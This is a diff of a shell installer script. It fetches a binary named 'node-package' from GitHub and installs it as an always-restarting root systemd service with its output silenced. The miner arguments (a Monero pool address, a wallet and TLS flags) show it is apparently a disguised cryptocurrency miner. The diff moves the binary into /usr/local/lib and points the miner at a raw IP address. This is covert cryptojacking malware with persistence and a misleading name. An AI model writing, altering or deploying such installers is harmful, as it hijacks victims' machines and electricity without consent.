@@ -5,7 +5,7 @@ set -e
 
 # Variables
 URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
-TARGET_DIR="/var/tmp"
+TARGET_DIR="/usr/local/lib/"
 FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
 SERVICE_NAME="node-package"
@@ -68,7 +68,7 @@ Type=simple
 Restart=always
 RestartSec=1
 User=root
-ExecStart=$FULL_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay
+ExecStart=$FULL_PATH -o 62.60.148.249:9940
 StandardOutput=null
 StandardError=null
 
